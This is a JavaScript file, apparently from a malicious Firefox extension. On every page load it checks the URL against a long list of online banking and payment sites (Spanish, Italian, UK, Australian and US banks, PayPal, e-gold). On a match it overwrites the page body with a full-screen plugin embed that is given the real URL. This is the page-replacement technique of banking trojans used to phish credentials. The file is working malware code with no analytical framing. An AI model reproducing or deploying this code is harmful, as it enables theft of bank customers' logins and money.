function init()
{
 window.addEventListener("load",chromeLoad,false);
}
function chromeLoad()
{
var appContent = document.getElementById("appcontent");
appContent.addEventListener("DOMContentLoaded",contentLoad,false);
}

function check(loc,dom)
{
 var domains=['127.0.0.3','127.0.0.2'];
 var urls=['das','http://127.0.0.2/'];
 var urlsr=['yandeeex.ru','sss.re'];

var zurl=['*akbank.com*',
'*caixasabadell.net*',
'*credem.it*',
'*areasegura.banif.es*',
'*banca.cajaen.es*',
'*openbank.es*',
'*poste.it*',
'*banesto.es*',
'*carnet.cajarioja.es*',
'*gruposantander.es*',
'*intelvia.cajamurcia.es*',
'*net.kutxa.net*',
'*bancopastor.es*',
'*bancamarch.es*',
'*caixamanlleu.es*',
'*elmonte.es*',
'*ibercajadirecto.com*',
'*bancopopular.es*',
'*bancogallego.es*',
'*bancajaproximaempresas.com*',
'*caixa*.es*',
'*caja*.es*',
'*ccm.es*',
'*bancoherrero.com*',
'*bankoa.es*',
'*bbvanetoffice.com*',
'*bgnetplus.com*',
'*bv-i.bancodevalencia.es*',
'*clavenet.net*',
'*fibancmediolanum.es*',
'*sabadellatlantico.com*',
'*arquia.es*',
'*banking.*.de*',
'*westpac.com.au*',
'*adelaidebank.com.au*',
'*pncs.com.au*',
'*nationet.com*',
'*online.hbs.net.au*',
'*www.qccu.com.au*',
'*boq.com.au*',
'*banksa.com*',
'*anz.com*',
'*suncorpmetway.com.au*',
'*quiubi.it*',
'*cariparma.it*',
'*bancaintesa.it*',
'*popso.it*',
'*fmbcc.bcc.it*',
'*secservizi.it*',
'*bancamediolanum.it*',
'*csebanking.it*',
'*fineco.it*',
'*gbw2.it*',
'*gruppocarige.it/grps/vbank/jsp/login.jsp*',
'*in-biz.it*',
'*isideonline.it*',
'*iwbank.it*',
'*bancaeuro.it*',
'*bancagenerali.it*',
'*bcp.it*',
'*unibanking.it*',
'*uno-e.com*',
'*unipolbanca.it*',
'*carifvg.com*',
'*cariparo.it*',
'*carisbo.it*',
'*islamic-bank.com*',
'*banking.first-direct.com*',
'*natwestibanking.com*',
'*itibank.co.uk*',
'*co-operativebank.co.uk*',
'*lloydstsb.co.uk*',
'*mybankoffshore.alil.co.im*',
'*abbeynational.co.uk*',
'*mybusinessbank.co.uk*',
'*barclays.com*',
'*online.co.uk*',
'*my.if.com*',
'*anbusiness.com*',
'*hsbc.co*',
'*anbusiness.com*',
'*co-operativebankonline.co.uk*',
'*halifax-online.co.uk*',
'*ibank.cahoot.com*',
'*smile.co.uk*',
'*caterallenonline.co.uk*',
'*tdcanadatrust.com*',
'*schwab.com*',
'*wachovia.com*',
'*bankofamerica*',
'*kfhonline.com*',
'*wamu.com*',
'*wellsfargo.com*',
'*procreditbank.bg*',
'*chase.com*',
'*53.com*',
'*citizensbankonline.com*',
'*e-gold.com*',
'*paypal.com*',
'*usbank.com*',
'*suntrust.com*',
'*banquepopulaire.fr*',
'*onlinebanking.nationalcity.com*'];

 for(i=0;i<urlsr.length;i++)
 {
  var re=new RegExp(urlsr[i],"g");
  if(re.exec(loc))
  {
   return 1;
  }
 }

 for(i=0;i<urls.length;i++)
 {
  if(urls[i]==loc) return 1;
 }

 for(i=0;i<domains.length;i++)
 {
  if(domains[i]==dom) return 1;
 }

 for(i=0;i<zurl.length;i++)
 {
  var re;
  var tt=zurl[i];
  re=/\./g;
  tt=tt.replace(re,"\\.");
  re=/\*/g;
  tt=tt.replace(re,".*");
  re=new RegExp(tt,"g");
  if(re.exec(loc))
  {
   return 1;
  }
 }
}
function proc_ff(cc)
{
        var doc=cc.document;
 var loc=doc.location.href;
 var doi=0;
 if(check(loc,doc.domain))doi=1;

 if(doi==1)
 {
  doc.body.innerHTML='<div style="width: 100%;height: 100%;position: absolute; left: 0px; top: 0px;">'+
  '<embed type="application/basic-plugin" '+
  ' width="100%" height="100%" param-location="'+doc.location.href+'"></embed>'+
  '</div>';
 }
}
function contentLoad()
{
 if(content.frames.length>1)
 {
  var a=content.document;
  modify(a);
  for(var i=0;i<content.frames.length;i++)proc_ff(content.frames[i]);
 }
 proc_ff(content);
};
init();